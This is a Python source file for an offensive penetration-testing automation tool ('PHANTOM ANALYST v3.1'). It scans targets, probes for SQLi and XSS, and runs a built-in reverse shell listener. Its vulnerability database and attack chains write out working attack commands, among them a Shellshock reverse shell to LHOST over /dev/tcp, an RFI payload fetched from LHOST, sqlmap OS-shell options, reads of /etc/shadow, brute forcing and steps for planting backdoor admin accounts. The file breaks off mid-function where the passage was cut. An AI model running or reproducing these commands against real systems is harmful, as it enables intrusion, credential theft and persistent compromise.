#!/usr/bin/env python3
"""
PHANTOM ANALYST v3.1 - Fixed Edition
Fixes:
  - FIX 1: Attack chains now filtered by actual findings (no more hallucinated FTP/SQLi chains)
  - FIX 2: DNS/port findings now checked against parsed port list, not raw string match
  - FIX 3: SSL finding only raised when weak cipher/protocol actually detected in nmap output
  - FIX 4: Thread hang fixed - subprocess timeout + thread join deadline added
"""

import re, os, sys, json, argparse, socket, subprocess
import threading, queue, time, shutil
from datetime import datetime

R="\033[91m"; G="\033[92m"; Y="\033[93m"; B="\033[94m"
C="\033[96m"; W="\033[97m"; DM="\033[2m"; X="\033[0m"; BLD="\033[1m"

REPORT_DIR = os.path.expanduser("~/phantom_reports")
OUTPUT_QUEUE = queue.Queue()
FINDINGS = []
FINDINGS_LOCK = threading.Lock()
LHOST = "127.0.0.1"

# ═══════════════════════════════════════════════════════════
# VULNERABILITY DATABASE
# ═══════════════════════════════════════════════════════════
VULN_DB = {
    "dnsmasq 2.5": {
        "title": "dnsmasq 2.51 Heap Overflow RCE",
        "severity": "CRITICAL", "cvss": 9.8, "cve": "CVE-2017-14491",
        "owasp": "A06:2021 Vulnerable Components",
        "mitre": "T1190 Exploit Public-Facing Application",
        "description": "dnsmasq 2.51 vulnerable to heap overflow RCE and DNS cache poisoning.",
        "remediation": "Upgrade dnsmasq to 2.83+. Update router firmware.",
        "poc": "dig @TARGET version.bind chaos txt",
        "next_steps": [
            "dig @TARGET version.bind chaos txt",
            "nmap --script dns-recursion -p 53 TARGET",
            "nmap --script dns-cache-snoop -p 53 TARGET",
            "nmap --script dns-zone-transfer -p 53 TARGET",
            "searchsploit dnsmasq",
            "Try http://TARGET for router admin panel",
        ],
        # FIX 2: require port 53 to actually be open
        "require_port": "53",
    },
    "dnsmasq": {
        "title": "dnsmasq DNS Service Detected",
        "severity": "HIGH", "cvss": 8.1, "cve": "CVE-2020-25686",
        "owasp": "A06:2021 Vulnerable Components",
        "mitre": "T1190 Exploit Public-Facing Application",
        "description": "dnsmasq detected. Vulnerable to DNS cache poisoning.",
        "remediation": "Upgrade dnsmasq to 2.83+.",
        "poc": "dig @TARGET version.bind chaos txt",
        "next_steps": [
            "dig @TARGET version.bind chaos txt",
            "nmap --script dns-recursion -p 53 TARGET",
            "Try router admin: http://TARGET",
        ],
        "require_port": "53",
    },
    "domain": {
        "title": "DNS Service Open - Info Disclosure Risk",
        "severity": "MEDIUM", "cvss": 5.8, "cve": "CWE-200",
        "owasp": "A05:2021 Security Misconfiguration",
        "mitre": "T1590 Gather Victim Network Information",
        "description": "DNS port 53 open. May allow zone transfer or cache snooping.",
        "remediation": "Disable recursion. Block external zone transfers.",
        "poc": "nmap --script dns-recursion,dns-zone-transfer -p 53 TARGET",
        "next_steps": [
            "dig @TARGET version.bind chaos txt",
            "nmap --script dns-recursion -p 53 TARGET",
            "nmap --script dns-zone-transfer -p 53 TARGET",
            "fierce --domain TARGET",
        ],
        # FIX 2: "domain" keyword appears in almost every nmap scan output.
        # Only flag this if port 53 is actually open.
        "require_port": "53",
    },
    "vsftpd 2.3.4": {
        "title": "vsftpd 2.3.4 Backdoor",
        "severity": "CRITICAL", "cvss": 10.0, "cve": "CVE-2011-2523",
        "owasp": "A06:2021 Vulnerable Components",
        "mitre": "T1190 Exploit Public-Facing Application",
        "description": "vsftpd 2.3.4 backdoor opens shell on port 6200.",
        "remediation": "Upgrade vsftpd to 2.3.5 immediately.",
        "poc": "nc TARGET 21 | USER :) | PASS x | nc TARGET 6200",
        "next_steps": [
            "nmap -p 6200 TARGET",
            "nc TARGET 6200",
            "id && whoami",
            "find / -perm -4000 2>/dev/null",
            "cat /etc/shadow",
        ],
        "require_port": "21",
        # FIX 1: this vuln triggers AC-001
        "triggers_chain": "AC-001",
    },
    "sql injection": {
        "title": "SQL Injection",
        "severity": "CRITICAL", "cvss": 9.8, "cve": "CWE-89",
        "owasp": "A03:2021 Injection",
        "mitre": "T1190 Exploit Public-Facing Application",
        "description": "SQL injection allows full DB read/write and auth bypass.",
        "remediation": "Use parameterized queries. Validate all inputs.",
        "poc": "sqlmap -u http://TARGET/page.php?id=1 --dbs --batch",
        "next_steps": [
            "sqlmap -u http://TARGET/vuln.php?id=1 --dbs --batch",
            "sqlmap -u http://TARGET/vuln.php?id=1 --passwords",
            "sqlmap -u http://TARGET/vuln.php?id=1 --os-shell",
            "sqlmap -u http://TARGET/vuln.php?id=1 --file-read=/etc/passwd",
        ],
        "triggers_chain": "AC-002",
    },
    "sqli": {
        "title": "SQL Injection Confirmed",
        "severity": "CRITICAL", "cvss": 9.8, "cve": "CWE-89",
        "owasp": "A03:2021 Injection",
        "mitre": "T1190 Exploit Public-Facing Application",
        "description": "SQLi confirmed. Full database access possible.",
        "remediation": "Use prepared statements.",
        "poc": "sqlmap -u http://TARGET/vuln.php?param=1 --dbs --batch --level=5",
        "next_steps": [
            "sqlmap -u http://TARGET/vuln.php?param=1 --dbs",
            "sqlmap -u http://TARGET/vuln.php?param=1 --is-dba",
            "sqlmap -u http://TARGET/vuln.php?param=1 --os-pwn",
        ],
        "triggers_chain": "AC-002",
    },
    "xss": {
        "title": "Cross-Site Scripting XSS",
        "severity": "HIGH", "cvss": 7.4, "cve": "CWE-79",
        "owasp": "A03:2021 Injection",
        "mitre": "T1189 Drive-by Compromise",
        "description": "XSS enables session hijacking and credential theft.",
        "remediation": "Encode all output. Implement CSP. Use HTTPOnly cookies.",
        "poc": "curl http://TARGET/search.php?q=<script>alert(1)</script>",
        "next_steps": [
            "Test all input fields with XSS payload",
            "xsser -u http://TARGET/page?q= --auto",
            "Check stored XSS in comments and profiles",
            "curl -I http://TARGET to check CSP headers",
        ],
    },
    "lfi": {
        "title": "Local File Inclusion LFI",
        "severity": "HIGH", "cvss": 8.1, "cve": "CWE-98",
        "owasp": "A03:2021 Injection",
        "mitre": "T1083 File and Directory Discovery",
        "description": "LFI allows reading sensitive server files.",
        "remediation": "Whitelist allowed files. Disable allow_url_include.",
        "poc": "curl http://TARGET/page.php?file=../../../../etc/passwd",
        "next_steps": [
            "curl http://TARGET/page.php?file=../../../../etc/passwd",
            "curl http://TARGET/page.php?file=../../../../etc/shadow",
            "Try log poisoning via User-Agent PHP payload",
            "curl http://TARGET/page.php?file=/proc/self/environ",
        ],
        "triggers_chain": "AC-003",
    },
    "rfi": {
        "title": "Remote File Inclusion RFI",
        "severity": "CRITICAL", "cvss": 9.8, "cve": "CWE-98",
        "owasp": "A03:2021 Injection",
        "mitre": "T1059 Command and Scripting Interpreter",
        "description": "RFI allows RCE via attacker controlled files.",
        "remediation": "Set allow_url_include=Off in php.ini.",
        "poc": "curl http://TARGET/page.php?file=http://LHOST/shell.txt",
        "next_steps": [
            "python3 -m http.server 80 on LHOST",
            "curl http://TARGET/page.php?file=http://LHOST/shell.txt",
            "Use msfvenom for reverse shell payload",
        ],
    },
    "directory listing": {
        "title": "Directory Listing Enabled",
        "severity": "MEDIUM", "cvss": 5.3, "cve": "CWE-548",
        "owasp": "A05:2021 Security Misconfiguration",
        "mitre": "T1083 File and Directory Discovery",
        "description": "Directory listing exposes internal files.",
        "remediation": "Add Options -Indexes to Apache config.",
        "poc": "curl http://TARGET/uploads/",
        "next_steps": [
            "gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt",
            "curl http://TARGET/backup/",
            "wget -r http://TARGET/uploads/",
        ],
        "triggers_chain": "AC-003",
    },
    "default credentials": {
        "title": "Default Credentials Active",
        "severity": "CRITICAL", "cvss": 9.8, "cve": "CWE-1392",
        "owasp": "A07:2021 Authentication Failures",
        "mitre": "T1078.001 Default Accounts",
        "description": "Default credentials allow immediate admin access.",
        "remediation": "Change all default passwords. Enable MFA.",
        "poc": "curl -X POST http://TARGET/admin/ -d user=admin&pass=admin",
        "next_steps": [
            "Explore full admin panel after login",
            "Look for file upload functionality",
            "Create backdoor admin account",
        ],
        "triggers_chain": "AC-002",
    },
    "admin:admin": {
        "title": "Default Credentials admin:admin Confirmed",
        "severity": "CRITICAL", "cvss": 9.8, "cve": "CWE-1392",
        "owasp": "A07:2021 Authentication Failures",
        "mitre": "T1078.001 Default Accounts",
        "description": "admin:admin confirmed on admin panel.",
        "remediation": "Change password immediately. Add account lockout.",
        "poc": "curl -c cookies.txt -X POST http://TARGET/admin/ -d username=admin&password=admin",
        "next_steps": [
            "Login and map all admin functionality",
            "Look for file upload or shell execution",
            "Add persistent backdoor admin account",
        ],
        "triggers_chain": "AC-002",
    },
    "apache 2.2": {
        "title": "Apache 2.2.x Multiple Vulnerabilities",
        "severity": "HIGH", "cvss": 7.5, "cve": "CVE-2009-3555",
        "owasp": "A06:2021 Vulnerable Components",
        "mitre": "T1190 Exploit Public-Facing Application",
        "description": "Apache 2.2 outdated with multiple known CVEs.",
        "remediation": "Upgrade Apache to 2.4.x immediately.",
        "poc": "nikto -h http://TARGET",
        "next_steps": [
            "nikto -h http://TARGET",
            "searchsploit apache 2.2",
            "curl -v http://TARGET/server-status",
        ],
    },
    "mysql 5.0": {
        "title": "MySQL 5.0 Outdated and Exposed",
        "severity": "HIGH", "cvss": 7.2, "cve": "CVE-2009-4484",
        "owasp": "A05:2021 Security Misconfiguration",
        "mitre": "T1190 Exploit Public-Facing Application",
        "description": "MySQL 5.0 exposed externally allows brute force.",
        "remediation": "Upgrade MySQL. Bind to 127.0.0.1. Firewall 3306.",
        "poc": "nmap --script mysql-empty-password -p 3306 TARGET",
        "next_steps": [
            "mysql -h TARGET -u root",
            "hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://TARGET",
            "nmap --script mysql-brute -p 3306 TARGET",
        ],
        "require_port": "3306",
    },
    "openssh 4.7": {
        "title": "OpenSSH 4.7 CBC Mode Vulnerability",
        "severity": "HIGH", "cvss": 7.8, "cve": "CVE-2008-5161",
        "owasp": "A06:2021 Vulnerable Components",
        "mitre": "T1021.004 Remote Services SSH",
        "description": "OpenSSH 4.7 vulnerable to CBC mode plaintext recovery.",
        "remediation": "Upgrade OpenSSH to 7.4+. Disable CBC ciphers.",
        "poc": "nmap --script ssh2-enum-algos -p 22 TARGET",
        "next_steps": [
            "hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://TARGET",
            "ssh-audit TARGET",
            "searchsploit openssh 4.7",
        ],
        "require_port": "22",
    },
    "tomcat 6": {
        "title": "Apache Tomcat 6.x End of Life",
        "severity": "HIGH", "cvss": 7.5, "cve": "CVE-2010-2227",
        "owasp": "A06:2021 Vulnerable Components",
        "mitre": "T1190 Exploit Public-Facing Application",
        "description": "Tomcat 6.x EOL with multiple unpatched vulnerabilities.",
        "remediation": "Upgrade Tomcat to 9.x or later.",
        "poc": "curl http://TARGET:8080/manager/html",
        "next_steps": [
            "curl http://TARGET:8080/manager/html",
            "searchsploit tomcat 6",
            "msfconsole use exploit/multi/http/tomcat_mgr_upload",
        ],
        "require_port": "8080",
    },
    "wordpress": {
        "title": "WordPress Installation Detected",
        "severity": "MEDIUM", "cvss": 6.5, "cve": "CWE-1035",
        "owasp": "A06:2021 Vulnerable Components",
        "mitre": "T1190 Exploit Public-Facing Application",
        "description": "WordPress detected. May have vulnerable plugins.",
        "remediation": "Keep WordPress and plugins updated.",
        "poc": "wpscan --url http://TARGET --enumerate vp,vt,u",
        "next_steps": [
            "wpscan --url http://TARGET --enumerate vp",
            "wpscan --url http://TARGET --enumerate u",
            "wpscan --url http://TARGET -P /usr/share/wordlists/rockyou.txt",
        ],
    },
    "shellshock": {
        "title": "Shellshock Bash RCE",
        "severity": "CRITICAL", "cvss": 10.0, "cve": "CVE-2014-6271",
        "owasp": "A06:2021 Vulnerable Components",
        "mitre": "T1059.004 Unix Shell",
        "description": "Shellshock allows RCE via HTTP headers in CGI scripts.",
        "remediation": "Update bash. Disable CGI if not needed.",
        "poc": "curl -H User-Agent:() { :;}; /bin/id http://TARGET/cgi-bin/test.cgi",
        "next_steps": [
            "nmap --script http-shellshock TARGET",
            "nc -lvnp 4444 on LHOST first",
            "curl -H User-Agent:() { :;}; /bin/bash -i >& /dev/tcp/LHOST/4444 0>&1 http://TARGET/cgi-bin/",
        ],
    },
    # FIX 3: "ssl" keyword was matching ANY https response.
    # Renamed key to require weak protocol evidence in the output.
    "sslv2": {
        "title": "SSL TLS Misconfiguration",
        "severity": "MEDIUM", "cvss": 5.9, "cve": "CVE-2009-3555",
        "owasp": "A02:2021 Cryptographic Failures",
        "mitre": "T1557 Adversary-in-the-Middle",
        "description": "Weak SSL/TLS allows downgrade and MITM attacks.",
        "remediation": "Use TLS 1.2+. Disable SSLv2/v3.",
        "poc": "sslscan TARGET:443",
        "next_steps": [
            "sslscan TARGET:443",
            "nmap --script ssl-enum-ciphers -p 443 TARGET",
            "nmap --script ssl-heartbleed -p 443 TARGET",
        ],
        "require_port": "443",
    },
    "http trace": {
        "title": "HTTP TRACE Method Enabled",
        "severity": "LOW", "cvss": 3.1, "cve": "CVE-2003-1567",
        "owasp": "A05:2021 Security Misconfiguration",
        "mitre": "T1040 Network Sniffing",
        "description": "TRACE method allows Cross-Site Tracing attacks.",
        "remediation": "Add TraceEnable off to Apache config.",
        "poc": "curl -X TRACE http://TARGET/",
        "next_steps": [
            "curl -X TRACE http://TARGET/",
            "nmap --script http-methods TARGET",
        ],
    },
    "anonymous ftp": {
        "title": "Anonymous FTP Login Enabled",
        "severity": "HIGH", "cvss": 7.5, "cve": "CWE-284",
        "owasp": "A01:2021 Broken Access Control",
        "mitre": "T1078.001 Default Accounts",
        "description": "FTP allows anonymous access without authentication.",
        "remediation": "Disable anonymous_enable in vsftpd.conf.",
        "poc": "ftp TARGET then login anonymous:anonymous",
        "next_steps": [
            "ftp TARGET login anonymous:anonymous",
            "ls -la to list all files",
            "Check write: ftp put test.txt",
            "nmap --script ftp-anon -p 21 TARGET",
        ],
        "require_port": "21",
    },
    "phpmyadmin": {
        "title": "phpMyAdmin Exposed",
        "severity": "HIGH", "cvss": 8.0, "cve": "CVE-2018-12613",
        "owasp": "A05:2021 Security Misconfiguration",
        "mitre": "T1190 Exploit Public-Facing Application",
        "description": "phpMyAdmin exposed publicly. Risk of DB access and RCE.",
        "remediation": "Restrict phpMyAdmin to localhost only.",
        "poc": "curl http://TARGET/phpmyadmin/",
        "next_steps": [
            "Try default creds: root empty, root:root, root:mysql",
            "hydra brute force phpmyadmin login",
            "If login: SELECT INTO OUTFILE for webshell",
            "searchsploit phpmyadmin",
        ],
    },
    "open port 3306": {
        "title": "MySQL Port 3306 Exposed",
        "severity": "HIGH", "cvss": 7.5, "cve": "CWE-284",
        "owasp": "A05:2021 Security Misconfiguration",
        "mitre": "T1190 Exploit Public-Facing Application",
        "description": "MySQL port 3306 accessible externally.",
        "remediation": "Bind MySQL to localhost. Firewall port 3306.",
        "poc": "nmap -sV -p 3306 TARGET",
        "next_steps": [
            "mysql -h TARGET -u root",
            "nmap --script mysql-empty-password -p 3306 TARGET",
            "hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://TARGET",
        ],
        "require_port": "3306",
    },
}

# ═══════════════════════════════════════════════════════════
# FIX 1: ATTACK CHAIN DEFINITIONS WITH TRIGGER CONDITIONS
# Each chain now has a 'requires' field listing vuln titles
# that must be present in findings before the chain is shown.
# ═══════════════════════════════════════════════════════════
ATTACK_CHAINS = [
    {
        "id": "AC-001", "name": "FTP Backdoor to Root Shell",
        # logic="any": chain fires if ANY of these vulns is found
        "requires": ["vsftpd 2.3.4 Backdoor"],
        "logic": "any",
        "steps": [
            "1. Exploit vsftpd 2.3.4 backdoor via port 21",
            "2. Get shell on port 6200",
            "3. Find SUID binaries for privilege escalation",
            "4. Escalate to root",
            "5. Dump /etc/shadow for offline cracking",
        ],
        "impact": "Full system compromise",
        "tools": "nc, find, python, hashcat",
    },
    {
        "id": "AC-002", "name": "Default Creds + SQLi = DB Takeover",
        # logic="any": fires if ANY SQLi OR any default-creds finding present
        "requires": ["SQL Injection", "SQL Injection Confirmed",
                     "Default Credentials Active",
                     "Default Credentials admin:admin Confirmed"],
        "logic": "any",
        "steps": [
            "1. Login with admin:admin credentials",
            "2. Find SQLi in admin panel search fields",
            "3. Dump all credentials with sqlmap",
            "4. Crack hashes with hashcat and rockyou",
            "5. Authenticate as any user",
        ],
        "impact": "Full database exfiltration",
        "tools": "curl, sqlmap, hashcat",
    },
    {
        "id": "AC-003", "name": "Directory Listing + LFI = RCE",
        # logic="all": BOTH directory listing AND LFI must be found —
        # neither alone is enough to execute this chain
        "requires": ["Directory Listing Enabled", "Local File Inclusion LFI"],
        "logic": "all",
        "steps": [
            "1. Directory listing reveals log paths",
            "2. LFI confirmed on file parameter",
            "3. Poison Apache log via PHP in User-Agent",
            "4. Include poisoned log via LFI for RCE",
            "5. Upgrade to reverse shell",
        ],
        "impact": "Remote code execution as www-data",
        "tools": "curl, nc, gobuster",
    },
]

def get_relevant_chains(findings):
    """
    Return only attack chains whose required vulns are present.
    logic='any'  — at least one required vuln must be found (OR logic)
    logic='all'  — every required vuln must be found (AND logic)
    """
    found_titles = {f["title"] for f in findings}
    relevant = []
    for chain in ATTACK_CHAINS:
        logic = chain.get("logic", "any")
        if logic == "all":
            if all(req in found_titles for req in chain["requires"]):
                relevant.append(chain)
        else:  # "any"
            if any(req in found_titles for req in chain["requires"]):
                relevant.append(chain)
    return relevant

# ═══════════════════════════════════════════════════════════
# HELPERS
# ═══════════════════════════════════════════════════════════
def banner():
    print(C + BLD + """
██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗
██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║
██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║
██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║
██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝
""" + X)
    print(DM + "  v3.1 | Fixed | No False Positives | Verified Findings Only" + X)
    print(DM + "  Authorized Lab Use Only\n" + X)

def section(title, color=C):
    print("\n" + color + BLD + "=" * 60 + X)
    print(color + BLD + "  " + title + X)
    print(color + BLD + "=" * 60 + X + "\n")

def log(msg, color=W):
    ts = datetime.now().strftime("%H:%M:%S")
    print(DM + "[" + ts + "]" + X + " " + color + msg + X, flush=True)

def sev_color(sev):
    return {"CRITICAL": R, "HIGH": Y, "MEDIUM": B, "LOW": G}.get(sev, DM)

# ═══════════════════════════════════════════════════════════
# FEATURE 1: DEPENDENCY CHECKER
# ═══════════════════════════════════════════════════════════
def check_dependencies():
    section("DEPENDENCY CHECK", C)
    required = {
        "nmap":     "sudo apt install nmap -y",
        "curl":     "sudo apt install curl -y",
        "sqlmap":   "sudo apt install sqlmap -y",
        "nikto":    "sudo apt install nikto -y",
        "gobuster": "sudo apt install gobuster -y",
        "hydra":    "sudo apt install hydra -y",
        "dig":      "sudo apt install dnsutils -y",
        "nc":       "sudo apt install netcat-traditional -y",
        "whatweb":  "sudo apt install whatweb -y",
    }
    optional = {
        "wpscan":   "sudo apt install wpscan -y",
        "masscan":  "sudo apt install masscan -y",
        "sslscan":  "sudo apt install sslscan -y",
        "wafw00f":  "pip install wafw00f --break-system-packages",
    }
    missing_required = []
    print(W + BLD + "Required Tools:" + X)
    for tool, install in required.items():
        found = shutil.which(tool) is not None
        status = G + "FOUND" + X if found else R + "MISSING" + X
        print("  " + W + tool.ljust(12) + X + status)
        if not found:
            missing_required.append((tool, install))

    print("\n" + W + BLD + "Optional Tools:" + X)
    for tool, install in optional.items():
        found = shutil.which(tool) is not None
        status = G + "FOUND" + X if found else Y + "OPTIONAL" + X
        print("  " + W + tool.ljust(12) + X + status)

    if missing_required:
        print("\n" + R + BLD + "Install missing required tools:" + X)
        for tool, cmd in missing_required:
            print("  " + Y + "$ " + cmd + X)
        print()
    else:
        print("\n" + G + BLD + "All required tools found!" + X + "\n")

# ═══════════════════════════════════════════════════════════
# FEATURE 2: AUTO LHOST DETECTION
# ═══════════════════════════════════════════════════════════
def get_lhost():
    global LHOST
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        LHOST = s.getsockname()[0]
        s.close()
    except Exception:
        try:
            LHOST = socket.gethostbyname(socket.gethostname())
        except Exception:
            LHOST = "127.0.0.1"
    log("Auto-detected LHOST: " + LHOST, G)
    return LHOST

# ═══════════════════════════════════════════════════════════
# FEATURE 3: LIVE STREAMING COMMAND RUNNER
# ═══════════════════════════════════════════════════════════
def run_live(cmd, label, color=DM, timeout=60):
    print("\n" + Y + BLD + ">> " + label + X)
    print(DM + "   CMD: " + cmd + X + "\n")
    output_lines = []
    try:
        proc = subprocess.Popen(
            cmd, shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            universal_newlines=True,
            bufsize=1
        )
        # FIX 4: communicate() with timeout prevents hanging
        try:
            stdout, _ = proc.communicate(timeout=timeout)
            for line in stdout.splitlines():
                line = line.rstrip()
                if line:
                    print(color + "   " + line + X, flush=True)
                    output_lines.append(line)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.communicate()
            log("Command timed out after " + str(timeout) + "s: " + label, Y)
    except Exception as e:
        print(DM + "   [error: " + str(e) + "]" + X)
    return "\n".join(output_lines)

# ═══════════════════════════════════════════════════════════
# FEATURE 4: VULNERABILITY VERIFICATION
# ═══════════════════════════════════════════════════════════
def verify_xss(host, path="/"):
    probe = "phantom123xss"
    try:
        out = os.popen("curl -s --max-time 5 'http://" + host +
                       path + "?q=" + probe + "' 2>/dev/null").read()
        if probe in out:
            log("XSS VERIFIED: probe string reflected in response", R)
            return True
    except Exception:
        pass
    return False

def verify_sqli(host, path="/?id="):
    try:
        out = os.popen("curl -s --max-time 5 'http://" + host +
                       path + "1%27' 2>/dev/null").read()
        errors = ["sql syntax", "mysql_fetch", "ORA-", "sqlite3",
                  "pg_query", "syntax error", "unclosed quotation"]
        for e in errors:
            if e.lower() in out.lower():
                log("SQLi VERIFIED: DB error in response", R)
                return True
    except Exception:
        pass
    return False

def verify_dir_listing(host, path):
    try:
        out = os.popen("curl -s --max-time 5 'http://" + host +
                       path + "' 2>/dev/null").read()
        if "index of" in out.lower() or "parent directory" in out.lower():
            log("DIR LISTING VERIFIED: " + path, R)
            return True
    except Exception:
        pass
    return False

# FIX 3: Check for actual weak SSL/TLS evidence in nmap output
def check_weak_ssl(nmap_out):
    weak_indicators = [
        "sslv2", "sslv3", "tlsv1.0", "tlsv1 ", "ssl2", "ssl3",
        "rc4", "des-cbc", "export", "null cipher", "weak cipher",
        "ssl-heartbleed", "poodle", "drown"
    ]
    lower = nmap_out.lower()
    for indicator in weak_indicators:
        if indicator in lower:
            log("Weak SSL/TLS indicator found: " + indicator, Y)
            return True
    return False

# ═══════════════════════════════════════════════════════════
# FEATURE 5: RECURSIVE DIRECTORY BRUTE FORCE
# ═══════════════════════════════════════════════════════════
def recursive_dir_scan(host, base_path="/", depth=0, max_depth=2):
    if depth > max_depth:
        return []
    found = []
    dirs = ["/admin", "/backup", "/config", "/login", "/uploads",
            "/images", "/files", "/data", "/includes", "/js",
            "/css", "/api", "/v1", "/v2", "/tmp", "/logs",
            "/.git", "/.env", "/wp-content", "/wp-admin",
            "/phpmyadmin", "/manager", "/console", "/shell"]
    for d in dirs:
        path = base_path.rstrip("/") + d
        try:
            r = os.popen("curl -s -o /dev/null -w '%{http_code}' "
                         "--max-time 3 'http://" + host + path + "' 2>/dev/null").read().strip()
            if r in ["200", "301", "302", "403"]:
                icon = G + "[" + r + "]" + X
                print("  " + icon + " http://" + host + path, flush=True)
                found.append((path, r))
                if r == "200" and depth < max_depth:
                    sub = recursive_dir_scan(host, path, depth + 1, max_depth)
                    found.extend(sub)
        except Exception:
            pass
    return found

# ═══════════════════════════════════════════════════════════
# FEATURE 6: REVERSE SHELL LISTENER
# ═══════════════════════════════════════════════════════════
def start_shell_listener(port=4444):
    def listen():
        log("Shell listener started on port " + str(port), G)
        log("Waiting for reverse shell connection...", Y)
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind(("0.0.0.0", port))
            s.listen(1)
            s.settimeout(30)
            conn, addr = s.accept()
            log("SHELL CAUGHT from: " + str(addr), R)
            print(R + BLD + "\n[REVERSE SHELL CONNECTED]" + X)
            print(DM + "Type commands. Type 'exit' to close.\n" + X)
            while True:
                try:
                    cmd = input(R + "shell> " + X)
                    if cmd.lower() == "exit":
                        break
                    conn.send((cmd + "\n").encode())
                    time.sleep(0.5)
                    out = conn.recv(4096).decode(errors="ignore")
                    print(G + out + X, flush=True)
                except KeyboardInterrupt:
                    break
            conn.close()
            s.close()
        except socket.timeout:
            log("Shell listener timed out after 30 seconds.", Y)
        except Exception as e:
            log("Shell listener error: " + str(e), R)
    t = threading.Thread(target=listen, daemon=True)
    t.start()
    return t

# ═══════════════════════════════════════════════════════════
# PHASE 1: ASYNC RECON AND SCANNING
# FIX 4: Added per-process timeout and thread join deadline
# ═══════════════════════════════════════════════════════════
def phase1_scan(target):
    section("PHASE 1  ASYNC RECON AND SCANNING", G)
    host = target.replace("*.", "").split("/")[0].strip()
    log("Target: " + host + " | LHOST: " + LHOST, Y)
    log("Running 12 nmap scans concurrently...", Y)

    all_output = []
    lock = threading.Lock()

    NMAP_SCANS = [
        ("nmap -sn TARGET",                          "1/12  Host Discovery"),
        ("nmap -sV -sC --open -T4 TARGET",           "2/12  Service + Script Scan"),
        ("nmap -p- --open -T4 TARGET",               "3/12  Full TCP (all 65535 ports)"),
        ("nmap -sU --top-ports 100 -T4 TARGET",      "4/12  UDP Scan Top 100"),
        ("nmap -O --osscan-guess TARGET",             "5/12  OS Detection"),
        ("nmap -A TARGET",                            "6/12  Aggressive (OS+Version+Trace)"),
        ("nmap --script vuln TARGET",                 "7/12  Vulnerability Scripts"),
        ("nmap -sC TARGET",                           "8/12  Default NSE Scripts"),
        ("nmap -sS --open TARGET",                    "9/12  SYN Stealth Scan"),
        ("nmap --script=banner TARGET",               "10/12 Banner Grabbing"),
        ("nmap --script dns-recursion,dns-cache-snoop,dns-zone-transfer -p 53 TARGET",
                                                      "11/12 DNS Recon"),
        ("nmap --script http-title,http-headers,http-methods,http-auth,http-robots.txt -p 80,443,8080,8443 TARGET",
                                                      "12/12 HTTP Recon"),
    ]

    # FIX 4: per-scan timeout of 120 seconds
    SCAN_TIMEOUT = 120

    def run_scan(cmd, label):
        full_cmd = cmd.replace("TARGET", host)
        print("\n" + C + BLD + "[ " + label + " ]" + X)
        print(DM + "  CMD: " + full_cmd + X + "\n")
        try:
            proc = subprocess.Popen(
                full_cmd, shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                universal_newlines=True,
                bufsize=1
            )
            try:
                # FIX 4: communicate with timeout — won't hang forever
                stdout, _ = proc.communicate(timeout=SCAN_TIMEOUT)
                lines = []
                for line in stdout.splitlines():
                    l = line.rstrip()
                    if l:
                        print(DM + "  " + l + X, flush=True)
                        lines.append(l)
                out = "\n".join(lines)
                with lock:
                    all_output.append(out)
            except subprocess.TimeoutExpired:
                proc.kill()
                proc.communicate()
                log("Scan timed out (" + str(SCAN_TIMEOUT) + "s): " + label, Y)
        except Exception as e:
            print(DM + "  [error: " + str(e) + "]" + X)

    threads = []
    for cmd, label in NMAP_SCANS:
        t = threading.Thread(target=run_scan, args=(cmd, label))
        t.start()
        threads.append(t)
        time.sleep(0.3)

    # FIX 4: join with deadline — total max wait = 180s not infinite
    deadline = time.time() + 180
    for t in threads:
        remaining = max(0, deadline - time.time())
        t.join(timeout=remaining)
        if t.is_alive():
            log("Thread still running after deadline — moving on.", Y)

    combined = "\n".join(all_output)

    print("\n" + C + BLD + "[ + ] WEB FINGERPRINT ]" + X)
    web_out = run_live("curl -s -I --max-time 5 http://" + host, "HTTP Headers", DM, timeout=10)

    print("\n" + C + BLD + "[ + ] RECURSIVE DIRECTORY SCAN ]" + X)
    log("Scanning directories recursively (depth 2)...", Y)
    found_dirs = recursive_dir_scan(host, "/", depth=0, max_depth=2)
    if not found_dirs:
        print(DM + "  [no directories found or HTTP not running]" + X)

    print("\n" + C + BLD + "[ + ] XSS VERIFICATION ]" + X)
    xss_verified = verify_xss(host)
    if xss_verified:
        print(R + "  XSS CONFIRMED via reflection test" + X)
    else:
        print(DM + "  XSS not verified via reflection" + X)

    print("\n" + C + BLD + "[ + ] SQLi VERIFICATION ]" + X)
    sqli_verified = verify_sqli(host)
    if sqli_verified:
        print(R + "  SQLi CONFIRMED via error-based test" + X)
    else:
        print(DM + "  SQLi not verified via error test" + X)

    # FIX 3: Check for weak SSL evidence
    print("\n" + C + BLD + "[ + ] SSL/TLS CHECK ]" + X)
    weak_ssl = check_weak_ssl(combined)
    if weak_ssl:
        print(Y + "  Weak SSL/TLS indicators detected in nmap output" + X)
    else:
        print(DM + "  No weak SSL/TLS indicators found" + X)

    print("\n" + C + BLD + "[ + ] DETECTED OPEN PORTS ]" + X)
    ports = re.findall(r'(\d+)/tcp\s+open\s+(\S+)\s*(.*)', combined)
    seen_p = set()
    unique_ports = []
    for port, svc, ver in ports:
        if port not in seen_p:
            seen_p.add(port)
            v = ver.strip()
            unique_ports.append((port, svc, v))
            print("  " + C + port + "/tcp" + X + " " +
                  W + svc.ljust(12) + X + DM + v[:40] + X)

    udp_ports = re.findall(r'(\d+)/udp\s+open\s+(\S+)\s*(.*)', combined)
    for port, svc, ver in udp_ports:
